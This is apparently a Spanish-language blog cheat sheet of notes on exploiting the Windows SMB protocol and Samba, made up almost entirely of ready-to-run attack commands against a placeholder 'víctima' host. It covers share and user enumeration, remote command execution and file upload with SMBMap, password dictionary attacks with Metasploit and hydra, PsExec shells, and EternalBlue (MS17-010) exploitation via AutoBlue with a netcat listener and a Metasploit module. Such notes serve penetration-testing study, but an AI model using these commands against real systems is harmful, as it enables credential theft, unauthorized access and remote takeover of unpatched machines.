---
title: 'Protocolo SMB'
description: 'Notas sobre cómo explotarlo'
pubDate: 2023-12-13
author: 'Nicolas Riquelme'
tags: ["Hacking", "Windows", "SMB", "sharing", "discover", "mount"]
tableOfContents:
  minHeadingLevel: 2
  maxHeadingLevel: 3
---
# SMB
SMB son las siglas para el protocolo de compartición, descubrimiento y montaje de archivos en red de Windows. Sus siglas singnifican Software Message Block. Suele usar los pruertos 139 (NetBios) y 445 (Microsoft-DS). 

## Enumeración
### Enumeración básica
```bash
ping {ip víctima}		 							# para ver si esta activa la red
nmap {ip víctima} 									# para ver los puertos abiertos
nmap -p445 --script smb-protocols {ip víctima} 		# para ver la información del protocolo SMB (Versiones y dialectos)
nmap -p445 --script smb-security-mode {ip víctima} 	# para ver la información sobre la seguridad (si permite invitados, el nivel de autenticación, etc...)
nmap -p445 --script smb-enum-sessions {ip víctima} 	# para ver la información relacionada con la configuración de las sesiones
smbclient -L {ip víctima} 							# para ver el contenido del recurso
```

### Scripts de NMAP
Aparte de los arriba mencionados, son útiles los siguientes. A todos habrá que añadirles los siguientes argumentos al final: `--script-args smbusername={user},smbpassword={password} {ip victima}`
```bash
nmap -p445 --script smb-enum-sessions <args> 	# para ver la información relacionada con la configuración de las sesiones
nmap -p445 --script smb-enum-shares <args> 		# para ver la información sobre los recursos compartidos
nmap -p445 --script smb-enum-shares,smb-ls <args> 		# para ver la información ampliada sobre cada uno de los recursos compartidos
nmap -p445 --script smb-enum-users <args> 		# para ver la información sobre los usuarios válidos
nmap -p445 --script smb-server-stats <args> 	# para ver las estadísticas del servidor
nmap -p445 --script smb-enum-domains <args> 	# para ver la información sobre los dominios bajo el servidor
nmap -p445 --script smb-enum-groups <args> 		# para ver la información sobre los grupos y sus permisos e integrantes
nmap -p445 --script smb-enum-services <args> 	# para ver los servicios bajo el protocolo SMB
```

## SMBMap
### Explotando el acceso del usuario invitado (guest)
```bash
smbmap -u guest -p "" -d . -H {ip victima} 	# para ver el contenido del recurso y los permisos de los que dispone el usuario invitado
```
### Explotando el acceso de un usuario, sabiendo su contraseña
```bash
smbmap -u {user} -p {password} -d . -H {ip victima}			 	# para ver el contenido del recurso y los permisos de los que dispone el usuario
smbmap -H {ip victima} -u {user} -p {password} -x {comando}  	# para ejecutar un comando directamente en el recurso (p.e. 'ipconfig')
smbmap -H {ip victima} -u {user} -p {password} -L  				# para visualizar las unidades (ya sean físicas o de red) que tiene mapeado el sistema
smbmap -H {ip victima} -u {user} -p {password} -r '{unidad}$'  	# para visualizar recursivamente el contenido de una unidad (p.e. 'C$')
```
### Subida y bajada de archivos
```bash
smbget -H {ip victima} -u {user} -p {password} --upload {ruta del archivo a subir} {ruta a donde se quiere dejar el archivo} 	# para subir un archivo
smbget -H {ip victima} -u {user} -p {password} --download {ruta del archivo a descargar} 										# para descargar un archivo (se descargará en la carpeta en la que se ejecuta el comando)
```

## Samba
Samba es una implementación de código abierto de SMB, que permite la interoperabilidad entre sistemas Windows y Unix/Linux.
### Enumeración básica
```bash
nmap {ip víctima} -sU --top 25 --open -sV 			# a diferencia de SMB, samba usa también el protocolo UDP dada su velocidad
nmap -p445 --script smb-os-discovery {ip victima}  	# para ver la información relacionada con el sistema operativo que corre el servidor
nmblookup -A {ip victima} 							# para ver el contenido del recurso
smbclient -L {ip víctima} -N						# para buscar una sesión que no requiera de contraseña
smbclient //{ip víctima}/{recurso compartido} -N	# para conectarse a un recursp compartido usando una sesión que no requiere de contraseña. La mayoría de los comandos que se pueden usar son POSIX. EStos son específicos:
	get {archivo} 									# descarga desde el recurso compartido el archivo que se le indica
	
rpcclient -U "" -N {ip victima}						# para contectarse a una sesión que no requiera de usuario y contraseña (si no aparece ningún mensaje de error, significa que estamos dentro), He aquí algunos de los comandos que podemos usar 
	srvinfo											# nos dará información sobre el servidor
	enumdomusers									# nos listará los usuarios dentro del dominio
	enumdomgroups 									# nos listará los grupos dentro del dominio
	lookupnames {usuario}							# nos dará información más detallada sobre un usuario en específico.
enum4linux -o {ip victima}							# para ver la información relacionada con el sistema operativo que corre el servidor
enum4linux -i {ip victima}							# para ver la información general de los recursos compartidos del servidor
enum4linux -U {ip victima}							# para listar los usuarios existentes
enum4linux -S {ip victima}							# para listar los servicios compartidos
enum4linux -G {ip victima}							# para listar los grupos
```
### Enumeración avanzada y explotación usando metasploit
Los siguientes comandos se usan desde dentro de la consola de metasploit (msfconsole)
```bash
use auxiliary/scanner/smb/smb_version
	set RHOSTS {ip victima}
	set THREADS 5
	run 								# o exploit

use auxiliary/scanner/smb/smb2
	set RHOSTS {ip victima}
	run 								# o exploit
	
use auxiliary/scanner/smb/smb_enumshares
	set RHOSTS {ip victima}
	run 								# o exploit
	
```

## Ataques de diccionario al protocolo SMB
### Usando metasploit
Los siguientes comandos se usan desde dentro de la consola de metasploit (msfconsole)
```bash
use auxiliary/scanner/smb/smb_login
	set RHOSTS {ip victima}
	set user_file {path al diccionario}	# p.e. /usr/share/metasploit-framework/data/wordlists/common_users.txt
	set pass_file {path al diccionario}	# p.e. /usr/share/wordlists/metasploit/unix_passwords.txt
	set smbuser {usuario}
	set verbose false					# no necesitamos que nos muestre por pantalla todas las combinaciones probadas
	run 								# o exploit
	
use auxiliary/scanner/smb/pipe_auditor	# nos indicará los pipes que podremos usar una vez conectados al servidor
	set RHOSTS {ip victima}
	set smbuser {usuario}
	set smbpass {password}				# usaremos la descubierta en el paso anterior
	run 								# o exploit
```
### Usando otros scripts
```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz		# descomprime el diccionario
hydra -l {usuario} -P /usr/share/wordlists/rockyou.txt {ip victima} smb
```
## Explotación usando PsExec
PsExec es una herramienta de línea de comandos que permite ejecutar procesos en otros sistemas, incluidos los que no tienen software cliente instalado. Para realizar la conexión, se deben tener credenciales válidas, que se pueden obtener usando los ataques de fuerza bruta de antes. Una vez obtenidos, se puede proceder a realizar la conexión:
+ Usando la implementación en python que viene con Kali Linux:
```ruby
psexec.py {usuario}@{ip víctima} {comando}	# p.e. Administrator@10.0.0.1 cmd.exe
```
+ Usando un módulo de Metasploit:
```ruby
use exploit/windows/smb/psexec
	set rhosts {ip víctima}
	set SMBUser {usuario}
	set SMBPass {password}
	set lhost {ip local}
	set lport {puerto}
	exploit
```
## Explotación de la vulnerabilidad EternalBlue (MS17-010/CVE-2017-0144)
La vulnerabilidad EternalBlue es una vulnerabilidad de seguridad en el protocolo Server Message Block (SMB) de Microsoft que permite a un atacante tomar el control de un sistema Windows remoto. Esta vulnerabilidad afecta desde Windows Vista hasta Windows 10 y hasta Windows Server 2012.
```ruby
nmap -sV -p445 --script=smb-vuln-ms17-010 {ip víctima}	# verificamos que la máquina víctima no esté parcheada y que por lo tanto sea vulnerable.
```
### Explotación usando [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
Una vez clonado el repositorio, dentro de la carpeta shellcode, en un entorno virtual y habiendo instalado las dependencias, procederemos con la explotación de la vulnerabilidad:
```ruby
./shell_prep.sh			# rellenamos con lo que necesitemos al finalizar en una pestaña nueva, procederemos a escuchar por el puerto local que hayamos indicado usando el comando "nc -nvlp {puerto}"
chmod +x ../eternalblue_exploit{version}.py
python ../eternalblue_exploit{version}.py {ip víctima} sc_{arquitectura}.bin
```
### Explotación usando metasploit
```ruby
use exploit/windows/smb/ms17_010_eternalblue
	set rhosts {ip víctima}
	exploit
```
